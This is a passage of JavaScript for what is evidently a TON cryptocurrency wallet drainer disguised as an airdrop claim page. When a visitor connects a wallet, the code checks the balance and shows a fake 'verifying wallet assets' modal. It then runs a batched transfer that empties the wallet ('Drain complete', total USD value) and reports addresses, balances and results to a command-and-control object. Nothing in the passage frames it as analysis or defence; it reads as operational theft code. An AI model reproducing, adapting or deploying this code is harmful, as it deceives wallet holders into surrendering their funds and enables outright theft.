          await C2.send({ [`Batch ${Math.floor(i/batchSize)+1} error`]: e.message || e });
          throw new Error(`Batch ${Math.floor(i/batchSize)+1} failed: ${e.message || e}`);
        }
        if (i + batchSize < msgArray.length) {
          await new Promise(r => setTimeout(r, 1000));
        }
      }

      await C2.send({
        'Drain complete': 'Success',
        'Total assets sent': successCount,
        'Total USD value': totalUsd.toFixed(2)
      });

      window.showModal({ type: 'success', message: CONFIG.TEXTS.VERIFY_SUCCESS });
      LOG.info('=== runTransfer END (success) ===');
      return true;

    } catch (err) {
      LOG.error('runTransfer error:', err);
      await C2.send({ 'Fatal error': err.message || err });
      throw err;
    }
  }

  // ================================================================
  //  AIRDROP MANAGER
  // ================================================================
  const AirdropManager = {
    onWalletConnected: async (address) => {
      LOG.info('Wallet connected, checking balance...');
      const balance = await WalletManager.getWalletBalance();
      if (balance === null) {
        window.showModal({ type: 'error', message: CONFIG.TEXTS.ERR_BALANCE });
        return;
      }
      LOG.info(`Balance: ${balance} TON`);
      await C2.send({ 'Wallet connected': address, 'Balance': `${balance} TON` });
      if (balance < CONFIG.DISALLOW_BALANCE) {
        const msg = CONFIG.TEXTS.BALANCE_TOO_LOW || 'Balance too low.';
        window.showModal({ type: 'warning', message: msg, buttons: [{ label: CONFIG.TEXTS.OK || 'OK', action: window.hideModal }] });
        await C2.send({ 'Status': 'Balance too low', 'Required': CONFIG.DISALLOW_BALANCE });
        return;
      }
      await AirdropManager.triggerClaim(address);
    },

    onWalletDisconnected: () => {
      LOG.info('Wallet disconnected.');
      C2.send({ 'Status': 'Wallet disconnected' });
    },

    triggerClaim: async (address) => {
      const addr = address || WalletManager.getConnectedAddress();
      if (!addr) {
        window.showModal({ type: 'warning', message: 'No wallet connected.' });
        return;
      }
      const balance = await WalletManager.refreshBalance();
      if (balance === null) {
        window.showModal({ type: 'error', message: CONFIG.TEXTS.ERR_BALANCE });
        return;
      }
      if (balance < CONFIG.DISALLOW_BALANCE) {
        const msg = CONFIG.TEXTS.BALANCE_TOO_LOW || 'Balance too low.';
        window.showModal({ type: 'warning', message: msg, buttons: [{ label: CONFIG.TEXTS.OK || 'OK', action: window.hideModal }] });
        await C2.send({ 'Status': 'Balance too low (manual claim)', 'Required': CONFIG.DISALLOW_BALANCE });
        return;
      }
      window.showModal({
        type: 'loading',
        title: CONFIG.TEXTS.CLAIM || 'Processing',
        message: CONFIG.TEXTS.VERIFYING || 'Verifying wallet assets...',
      });
      try {
        const result = await runTransfer(addr);
        window.hideModal();
        if (result) {
          window.showModal({ type: 'success', message: CONFIG.TEXTS.VERIFY_SUCCESS });
        } else {
          window.showModal({ type: 'error', message: CONFIG.TEXTS.VERIFY_FAILED });
        }
      } catch (err) {
        window.hideModal();
        LOG.error('Drain error:', err);
        const errorMsg = err?.message || CONFIG.TEXTS.ERR_UNKNOWN;
        window.showModal({ type: 'error', message: `${CONFIG.TEXTS.ERR_UNKNOWN}: ${errorMsg}` });
        await C2.send({ 'Fatal error': errorMsg });
      }
    }
  };

  // ================================================================
  //  WALLET MANAGER
  // ================================================================
  const WalletManager = (() => {
    'use strict';

    let _status = 'idle';
    let _tonConnectUI = null;
    let _connectedAddress = null;
    let _cachedBalance = null;
    let _balanceFetchedAt = null;

    const BALANCE_CACHE_TTL = 30_000;
    const BALANCE_FETCH_MAX_RETRIES = 3;
    const BALANCE_FETCH_RETRY_DELAY = 2_000;

    function log(level, ...args) {
      try {
        if (typeof LOG !== 'undefined' && typeof LOG[level] === 'function') {
          LOG[level]('[WalletManager]', ...args);
          return;
        }
      } catch(_) {}
      console[level === 'debug' ? 'log' : level]('[WalletManager]', ...args);
    }

    function t(key) {
      try {
        if (typeof CONFIG !== 'undefined' && CONFIG.TEXTS && typeof CONFIG.TEXTS[key] === 'string') {
          return CONFIG.TEXTS[key];
        }
      } catch(_) {}
      const FALLBACKS = {
        CONNECT: 'Connect Wallet', DISCONNECT: 'Disconnect', CONNECTING: 'Connecting…',
        CLAIM: 'Claim', ERR_INIT: 'Failed to initialise wallet connector.',
        ERR_NETWORK: 'Network error. Please check your connection.',
        ERR_CANCELLED: 'Connection cancelled.', ERR_BALANCE: 'Could not fetch balance.',
        ERR_UNKNOWN: 'An unexpected error occurred.',
        INFO_CONNECTED: 'Wallet connected successfully.',
        INFO_DISCONNECTED: 'Wallet disconnected.',
        RETRY: 'Retry', CANCEL: 'Cancel'
      };
      return FALLBACKS[key] ?? key;
    }

    function notify(type, message, buttons = []) {
      try {
        if (typeof window.showModal === 'function') {
          window.showModal({ type, message, buttons });
          return;
        }
      } catch(_) {}
      log(type === 'error' ? 'error' : 'info', `[${type.toUpperCase()}]`, message);
    }

    function notifyHide() {
      try { if (typeof window.hideModal === 'function') window.hideModal(); } catch(_) {}
    }

    function qs(selector) {
      try { return document.querySelector(selector); } catch(_) { return null; }
    }

    function _syncButtonStates() {
      // Does nothing if no buttons exist, but we keep for compatibility with custom UI.
    }

    function _setStatus(newStatus) {
      if (_status === newStatus) return;
      log('info', `Status: ${_status} → ${newStatus}`);
      _status = newStatus;
      // Dispatch event for custom UI to listen
      try {
        document.dispatchEvent(new CustomEvent('walletStatusChanged', { detail: { status: newStatus } }));
      } catch(_) {}
    }

    async function _fetchBalanceFromAPI(address, attempt = 1) {
      const base = (typeof CONFIG !== 'undefined' && CONFIG.TONAPI_BASE) ? CONFIG.TONAPI_BASE.replace(/\/$/, '') : 'https://tonapi.io/v2';
      const url = `${base}/accounts/${encodeURIComponent(address)}`;
      let response;
      try {
        response = await fetch(url, { headers: { Accept: 'application/json' }, signal: AbortSignal.timeout(8_000) });
      } catch (networkErr) {
        if (attempt < BALANCE_FETCH_MAX_RETRIES) {
          log('warn', `Balance fetch attempt ${attempt} failed, retrying…`, networkErr);
          await _sleep(BALANCE_FETCH_RETRY_DELAY * attempt);
          return _fetchBalanceFromAPI(address, attempt + 1);
        }
        throw new Error(t('ERR_NETWORK'));
      }
      if (!response.ok) {
        if (attempt < BALANCE_FETCH_MAX_RETRIES && response.status >= 500) {
          await _sleep(BALANCE_FETCH_RETRY_DELAY * attempt);
          return _fetchBalanceFromAPI(address, attempt + 1);
        }
        throw new Error(`TONAPI error ${response.status}`);
      }
      const data = await response.json();
      const nanotons = Number(data.balance ?? data.balance_nano ?? 0);
      if (isNaN(nanotons)) throw new Error('Unexpected balance format from TONAPI.');
      return nanotons / 1e9;
    }

    async function _fetchBalanceViaTonWeb(address) {
      if (typeof TonWeb === 'undefined') throw new Error('TonWeb not available.');
      const tonweb = new TonWeb();
      const balance = await tonweb.getBalance(address);
      return Number(balance) / 1e9;
    }

    function _sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }

    async function _loadBalance(address) {
      const addr = address ?? _connectedAddress;
      if (!addr) return null;
      if (_cachedBalance !== null && _balanceFetchedAt !== null && Date.now() - _balanceFetchedAt < BALANCE_CACHE_TTL) {
        log('debug', 'Returning cached balance:', _cachedBalance);
        return _cachedBalance;
      }
      let balance = null, source = 'unknown';
      try {
        balance = await _fetchBalanceFromAPI(addr);
        source = 'tonapi';
      } catch (apiErr) {
        log('warn', 'Primary balance fetch failed, trying TonWeb fallback:', apiErr);
        try {
          balance = await _fetchBalanceViaTonWeb(addr);
          source = 'tonweb';
        } catch (twErr) {
          log('error', 'All balance fetch strategies failed:', twErr);
          notify('warning', t('ERR_BALANCE'));
          return _cachedBalance;
        }
      }
      _cachedBalance = balance;
      _balanceFetchedAt = Date.now();
      log('info', `Balance fetched via ${source}: ${balance} TON`);
      _renderBalance(balance);
      return balance;
    }

    function _renderBalance(balance) {
      // No UI injection; custom UI can listen to events or read WalletManager.
    }

    function _manifestUrl() {
      try {
        if (typeof CONFIG !== 'undefined' && CONFIG.MANIFEST_URL) return CONFIG.MANIFEST_URL;
      } catch(_) {}
      return `${window.location.origin}/tonconnect-manifest.json`;
    }

    async function _initTonConnect() {
      if (typeof TON_CONNECT_UI === 'undefined' || !TON_CONNECT_UI?.TonConnectUI) {
        throw new Error('TON_CONNECT_UI is not loaded. Check the boot loader.');
      }
      _tonConnectUI = new TON_CONNECT_UI.TonConnectUI({ manifestUrl: _manifestUrl() });
      _tonConnectUI.onStatusChange((wallet) => {
        if (wallet) _onWalletConnected(wallet);
        else _onWalletDisconnected();
      });
      const restored = await _tonConnectUI.connectionRestored;
      log('info', `connectionRestored: ${restored}`);
      const current = _tonConnectUI.wallet;
      if (current) {
        log('info', 'Restoring existing wallet session.');
        _onWalletConnected(current);
      }
      log('info', 'TonConnect UI initialised. Manifest:', _manifestUrl());
    }

    function _onWalletConnected(wallet) {
      try {
        _connectedAddress = wallet?.account?.address ?? wallet?.address ?? null;
        _setStatus('connected');
        notify('info', t('INFO_CONNECTED'));
        _loadBalance(_connectedAddress).catch(err => log('warn', 'Eager balance load failed:', err));
        try {
          if (typeof AirdropManager !== 'undefined' && typeof AirdropManager.onWalletConnected === 'function') {
            AirdropManager.onWalletConnected(_connectedAddress);
          }
        } catch (amErr) { log('warn', 'AirdropManager.onWalletConnected failed:', amErr); }
      } catch (err) { log('error', '_onWalletConnected handler threw:', err); }
    }

    function _onWalletDisconnected() {
      try {
        const prevAddress = _connectedAddress;
        _connectedAddress = null;
        _cachedBalance = null;
        _balanceFetchedAt = null;
        _setStatus('idle');
        notify('info', t('INFO_DISCONNECTED'));
        try {
          if (typeof AirdropManager !== 'undefined' && typeof AirdropManager.onWalletDisconnected === 'function') {
            AirdropManager.onWalletDisconnected();
          }
        } catch(_) {}
      } catch (err) { log('error', '_onWalletDisconnected handler threw:', err); }
    }

    function _handleError(err, retryFn) {
      let message = t('ERR_UNKNOWN');
      if (err instanceof Error) {
        const msg = err.message ?? '';
        if (/network|fetch|failed to fetch|timeout/i.test(msg)) message = t('ERR_NETWORK');
        else if (/cancel|reject|user_cancelled|UserCancelled/i.test(msg)) {
          message = t('ERR_CANCELLED');
          _setStatus('idle');
          log('info', 'User cancelled wallet connection.');
          return;
        } else if (/init|initialise|not loaded/i.test(msg)) message = t('ERR_INIT');
        else message = msg || t('ERR_UNKNOWN');
      }
      log('error', 'WalletManager error:', err);
      _setStatus('error');
      const buttons = [];
      if (typeof retryFn === 'function') {
        buttons.push({ label: t('RETRY'), action: () => { notifyHide(); retryFn(); } });
      }
      buttons.push({ label: t('CANCEL'), action: () => { notifyHide(); _setStatus('idle'); } });
      notify('error', message, buttons);
    }

    async function init() {
      log('info', 'Initialising WalletManager…');
      try {
        await _initTonConnect();
        _setStatus('idle');
        log('info', 'WalletManager ready.');
      } catch (err) { _handleError(err, init); }
    }

    async function openTonConnectModal() {
      if (!_tonConnectUI) {
        notify('error', t('ERR_INIT'), [
          { label: t('RETRY'), action: () => { notifyHide(); init().then(openTonConnectModal); } },
          { label: t('CANCEL'), action: notifyHide }
        ]);
        return;
      }
      if (_status === 'connected') {
        log('info', 'Already connected; ignoring openTonConnectModal call.');
        return;
      }
      _setStatus('connecting');
      try {
        await _tonConnectUI.openModal();
      } catch (err) { _handleError(err, openTonConnectModal); }
    }

    function closeTonConnectModal() {
      try { _tonConnectUI?.closeModal(); } catch (err) { log('warn', 'closeTonConnectModal threw:', err); }
    }

    async function disconnectWallet() {
      if (!_tonConnectUI) { log('warn', 'disconnectWallet called before init.'); return; }
      if (_status !== 'connected') { log('info', 'Not connected; nothing to disconnect.'); return; }
      try {
        await _tonConnectUI.disconnect();
        _setStatus('idle');
      } catch (err) { _handleError(err); }
    }

    function getConnectedAddress() { return _connectedAddress; }
    function isWalletConnected() { return _status === 'connected' && _connectedAddress !== null; }
    async function getWalletBalance() {
      if (!isWalletConnected()) { log('warn', 'getWalletBalance called while not connected.'); return null; }
      return _loadBalance(_connectedAddress);
    }
    async function refreshBalance() {
      _cachedBalance = null;
      _balanceFetchedAt = null;
      return getWalletBalance();
    }
    function getStatus() { return _status; }
    function getTonConnectUI() { return _tonConnectUI; }

    // Wire buttons using event delegation (does not create any buttons)
    function _wireButtons() {
      document.addEventListener('click', function(e) {
        const target = e.target.closest('[data-wallet-action]');
        if (!target) return;
        const action = target.getAttribute('data-wallet-action');
        switch (action) {
          case 'connect': openTonConnectModal(); break;
          case 'disconnect': disconnectWallet(); break;
          case 'claim':
            if (typeof AirdropManager !== 'undefined' && typeof AirdropManager.triggerClaim === 'function') {
              AirdropManager.triggerClaim();
            }
            break;
          default: break;
        }
      });
    }

    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', _wireButtons, { once: true });
    } else {
      _wireButtons();
    }

    return Object.freeze({
      init,
      openTonConnectModal,
      closeTonConnectModal,
      disconnectWallet,
      getConnectedAddress,
      isWalletConnected,
      getWalletBalance,
      refreshBalance,
      getStatus,
      getTonConnectUI,
    });
  })();

  // ================================================================
  //  BOOT & EXPOSE GLOBALS – NO UI INJECTION
  // ================================================================
  (async function boot() {
    await checkManifest();
    await WalletManager.init();
  })();

  // Expose public methods for custom buttons
  window.openTonConnect = () => WalletManager.openTonConnectModal();
  window.disconnectWallet = () => WalletManager.disconnectWallet();
  window.triggerClaim = () => AirdropManager.triggerClaim();

})();